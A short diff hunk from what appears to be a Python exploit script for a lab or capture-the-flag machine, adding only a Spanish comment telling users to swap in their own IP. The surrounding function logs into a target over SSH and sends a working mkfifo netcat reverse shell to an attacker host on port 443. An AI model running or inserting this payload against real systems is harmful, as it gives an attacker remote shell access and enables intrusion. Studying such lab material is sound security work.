@@ -65,6 +65,7 @@ def MakeRequest():
 def sshconnection(username, password):
     s = pxssh.pxssh()
     s.login('10.10.11.100', username, password)
+    #Cambiar IP por la vuestra
     s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
     s.prompt()
     s.logout()
